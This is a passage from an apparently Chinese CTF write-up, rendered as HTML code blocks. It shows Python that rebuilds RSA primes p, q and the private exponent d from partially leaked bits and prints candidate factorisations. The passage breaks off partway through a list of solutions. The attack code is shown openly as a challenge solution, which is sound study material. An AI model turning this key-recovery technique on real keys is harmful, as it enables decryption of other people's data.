class="string">&#x27;1&#x27;</span>, <span class="number">1014</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">670</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">558</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">304</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">444</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">716</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">208</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">130</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">634</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">661</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">862</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">412</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">796</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">761</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">113</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">752</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">818</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">797</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">390</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">337</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">133</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">367</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">470</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">345</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">170</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">312</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">624</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">53</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">75</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">281</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">522</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">100</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">554</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">583</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">16</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">836</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">715</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">450</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">484</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">876</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">165</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">842</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">62</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">442</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">927</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">586</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">399</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">227</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">886</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">663</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">947</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">906</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">377</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">246</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">365</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">177</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">59</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">63</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">936</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">144</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">416</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">228</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">366</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">117</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">78</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">717</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">14</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">800</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">47</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">80</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">34</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">662</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">970</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">986</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">287</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">597</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">783</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">805</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">112</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">671</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">540</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">153</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">577</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">543</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">414</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">123</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">626</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">452</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">810</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">30</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">905</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">602</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">537</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">374</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">408</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">434</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">137</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">532</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">397</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">333</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">258</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">359</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">134</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">322</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">653</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">1018</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">639</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">40</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">826</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">489</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">5</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">858</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">44</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">516</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">149</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">945</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">106</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">694</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">221</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">207</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">186</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">316</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">449</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">297</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">276</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">103</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">437</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">802</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">108</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">921</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">427</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">728</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">879</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">953</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">51</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">459</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">37</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">559</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">610</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">341</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">299</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">952</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">201</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">327</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">741</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">253</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">310</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">946</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">696</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">398</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">266</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">829</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">908</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">469</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">873</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">658</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">798</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">54</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">621</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">238</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">654</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">205</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">925</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">391</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">480</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">4</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">598</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">677</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">142</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">606</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">118</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">164</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">973</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">347</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">159</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">307</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">83</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">668</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">675</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">924</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">191</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">890</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">352</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">965</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">692</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">782</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">817</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">889</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">515</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">433</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">356</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">845</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">104</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">18</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">979</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">426</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">785</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">546</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">52</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">55</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">824</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">704</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">510</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">710</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">1022</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">647</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">465</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">245</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">850</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">657</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">1007</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">807</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">158</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">328</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">292</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">355</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">596</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">275</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">371</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">1004</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">594</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">384</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">446</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">7</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">994</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">616</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">317</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">305</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">151</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">400</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">900</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">203</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">563</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">745</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">536</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">726</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">751</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">402</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">116</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">781</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">988</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">768</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">688</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">954</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">976</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">868</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">723</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">131</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">794</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">513</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">914</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">641</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">319</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">629</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">620</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">711</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">601</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">531</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">393</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">168</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">132</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">17</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">950</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">488</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">679</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">568</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">43</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">545</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">217</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">680</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">501</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">1008</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">514</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">746</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">187</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">436</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">336</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">139</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">338</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">695</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">300</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">584</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">152</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">828</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">251</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">691</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">296</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">128</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">394</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">655</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">544</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">58</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">313</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">565</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">685</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">720</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">178</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">667</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">403</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">697</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">138</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">659</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">960</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">454</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">271</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">33</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">295</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">600</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">579</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">68</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">211</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">82</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">114</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">209</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">226</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">753</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">874</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">903</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">358</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">141</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">236</span>: <span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getnum</span>(<span class="params">hint, bit</span>):</span><br><span class="line">    s = [<span class="string">&#x27;?&#x27;</span>] * bit</span><br><span class="line">    <span class="keyword">for</span> tmp <span class="keyword">in</span> hint.items():</span><br><span class="line">        s[tmp[<span class="number">0</span>]] = tmp[<span class="number">1</span>]</span><br><span class="line">    ss = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> ss.join(s)</span><br><span class="line"></span><br><span class="line">p_corr = getnum(hint1, <span class="number">512</span>)</span><br><span class="line">q_corr = getnum(hint2, <span class="number">512</span>)</span><br><span class="line">d_corr = getnum(hint3, <span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p = &#x27;</span>, p_corr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q = &#x27;</span>, q_corr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;d = &#x27;</span>, d_corr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_s</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> (x == <span class="string">&#x27;?&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> [<span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> [<span class="built_in">int</span>(x)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_3_k</span>(<span class="params">total_len</span>):</span><br><span class="line">    cur_ans = [(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)] <span class="comment"># d, p, q, k</span></span><br><span class="line">    mod_num = <span class="number">1</span></span><br><span class="line">    cur_num = <span class="number">1</span></span><br><span class="line">    k = <span class="number">1972411342</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(total_len):</span><br><span class="line">        mod_num *= <span class="number">2</span></span><br><span class="line">        nxt_ans = []</span><br><span class="line">        pset, qset, dset = <span class="built_in">set</span>(), <span class="built_in">set</span>(), <span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">for</span> d, p, q <span class="keyword">in</span> cur_ans:</span><br><span class="line">            <span class="keyword">for</span> cur_p <span class="keyword">in</span> get_s(p_corr[- i - <span class="number">1</span>]):</span><br><span class="line">                nxt_p = p + cur_p * cur_num</span><br><span class="line">                <span class="keyword">for</span> cur_q <span class="keyword">in</span> get_s(q_corr[- i - <span class="number">1</span>]):</span><br><span class="line">                    nxt_q = q + cur_q * cur_num</span><br><span class="line">                    <span class="comment"># check n = pq</span></span><br><span class="line">                    nxt_n = nxt_p * nxt_q % mod_num</span><br><span class="line">                    <span class="keyword">if</span> (n % mod_num == nxt_n):</span><br><span class="line">                        <span class="keyword">for</span> cur_d <span class="keyword">in</span> get_s(d_corr[- i -  <span class="number">1</span>]):</span><br><span class="line">                            nxt_d = d + cur_d * cur_num</span><br><span class="line">                            <span class="comment"># check phi</span></span><br><span class="line">                            <span class="keyword">if</span> (e * nxt_d % mod_num == (k * (nxt_p - <span class="number">1</span>) % mod_num * (nxt_q - <span class="number">1</span>) + <span class="number">1</span>) % mod_num):</span><br><span class="line">                                <span class="comment"># ok</span></span><br><span class="line">                                nxt_ans.append((nxt_d, nxt_p, nxt_q))</span><br><span class="line">                                pset.add(nxt_p)</span><br><span class="line">                                qset.add(nxt_q)</span><br><span class="line">                                dset.add(nxt_d)</span><br><span class="line">        cur_ans = nxt_ans</span><br><span class="line">        cur_num *= <span class="number">2</span></span><br><span class="line">        <span class="built_in">print</span>(i, <span class="built_in">len</span>(cur_ans), cur_ans[-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;number of p:&#x27;</span>, <span class="built_in">len</span>(pset))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;number of q:&#x27;</span>, <span class="built_in">len</span>(qset))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;number of d:&#x27;</span>, <span class="built_in">len</span>(dset))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cur_ans</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(update_3_k(<span class="number">512</span>))</span><br></pre></td></tr></table></figure><p>分解之后就有了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">73380160475470842653695210816683702314062827937540324056880543809752271506601290265975543542548117392788987830919581511428492717214125296973338501980504384307279414528799452106399062576988406269897425829853390463840834798274139351938197666753546672052277640048588091137812362810008344723302886421059831149393</span></span><br><span class="line">e = <span class="number">3116872133</span></span><br><span class="line">c = <span class="number">69574121902821459446683688068339366486115223765903849266663001038736496551168104587683366853482649748413400537793260948337629422998336301256862519087984048032673577462034223842650399943613576577927825123830629917138007035313624847266208032195071033675853881447717750353382112841885318776240405314057286867952</span></span><br><span class="line"></span><br><span class="line">sol_list = [(<span class="number">7784868472609835283772369288450719687831855595004708832036599005696915154950995935461077898788049056940742159122868259556603407924884969346573163242612229</span>, <span class="number">5366239629682084697715680375675183284975073589647891453436177052547030069350226021009383094270291268448822558390838025112113425896384691203885755013446291</span>, <span class="number">7752453331027896289378165428906797427594364441082026942376869840211846057088210327758608246566696642059981985937946346433942230652922826983630336158233867</span>), (<span class="number">7784868472609835283772369288450719687831855595004708832036599005696915154950995935461077898788049056940742159122868259556603407924884969346573163242612229</span>, <span class="number">12070143594653383247502692874778106348714756499944088142297957774407912084386999509410320243353742982293838487484081050538990367302357976177102579516488339</span>, <span class="number">1048549366056597739591152929803874363854681530785830253515089118350964042051436839357671097483244928214966056844703321007065289246949542010413511655191819</span>), (<span class="number">1080964507638536733985356789347796624092172684708512143174818283836033139914222447060140749704597343095726230029625234129726466518911684373356338739570181</span>, <span class="number">2433281645007141582183862407317654444588962316393305402059147986732894187771637619833973091546281143641628089412544201487854764031271379028103394293365395</span>, <span class="number">7333459333217190130016477147712864736110634259188514649323008545095540931148411984733549674748980909944668490369618657344762421815049496672804284626793739</span>), (<span class="number">1080964507638536733985356789347796624092172684708512143174818283836033139914222447060140749704597343095726230029625234129726466518911684373356338739570181</span>, <span class="number">9137185609978440131970874906420577508328645226689502090920928708593776202808411108234910240629732857486644018505787226914731705437244664001320218796407443</span>, <span class="number">629555368245891580229464648609941672370951348892317960461227823234658916111638496332612525665529196099652561276375631917885480409076211699587460123751691</span>), (<span class="number">7919489015169557662429127754565768355549835525176027430319638757565113735078207393658554845331317666676034000955470463920503224389516790946448824722679301</span>, <span class="number">1802354785201290177466884084338089546571783201683146314594751112680946785671485962333750690939270314498621839653134209205738944793709927368604997459819155</span>, <span class="number">1938968369951956383692914074846193565952605977994141608508479664130135156436350531430956937073490508744644524832859364144490425643565423141221879893357835</span>), (<span class="number">7919489015169557662429127754565768355549835525176027430319638757565113735078207393658554845331317666676034000955470463920503224389516790946448824722679301</span>, <span class="number">8506258750172588727253896583441012610311466111979343003456531834541828800708259450734687840022722028343637768746377234632615886199683212341821821962861203</span>, <span class="number">8642872334923254933479926573949116629692288888290338297370260385991017171473124019831894086156942222589660453926102389571367367049538708114438704396399883</span>), (<span class="number">1215585050198259112642115255462845291810152614879830741457858035704231720041433905257617696247865952831018071862227438493626282983543505973232000219637253</span>, <span class="number">5573300765497645611722078615083483769925354838724756952079502768727692919129671049559277837298711903536443299768083411008357224334569900166039461242780307</span>, <span class="number">8223878337112548774118238292755183938208558706396826004316399090874712045533325676806835514339226490474346958357774700482187558211665377803612652864959755</span>), (<span class="number">1215585050198259112642115255462845291810152614879830741457858035704231720041433905257617696247865952831018071862227438493626282983543505973232000219637253</span>, <span class="number">12277204730468944161509091114186406833665037749020953640941283490588574934166444537960214986382163617381459228861326436435234165740543185139256285745822355</span>, <span class="number">1519974372141250224331225793652260874468875796100629315454618369013830030496552188405898365255774776629331029264531675055310616805692092830395828361917707</span>), (<span class="number">7734921245373868987957633397815241793128376406577702659406870494917041423397863464444263406492935867521512547965938537313634187669740963333142964343301637</span>, <span class="number">2039677277102509201846962486845547473896091736477285128799254489086577739322976113889959601594776791686842028494481573651372391063246536352650723217029779</span>, <span class="number">1257898532286632316712997010434751098568684325677402896642438617119803235501528656939875312897703963741941819407675370807672885257529089521223286466966795</span>), (<span class="number">7734921245373868987957633397815241793128376406577702659406870494917041423397863464444263406492935867521512547965938537313634187669740963333142964343301637</span>, <span class="number">8743581242073807751633974985948470537635774646773481817661035210947459754359749602290896750678228505531857957587724599078249332469219821325867547720071827</span>, <span class="number">7961802497257930866500009509537674162308367235973599585504219338980685250538302145340812461981155677586957748500918396234549826663502374494440110970008843</span>), (<span 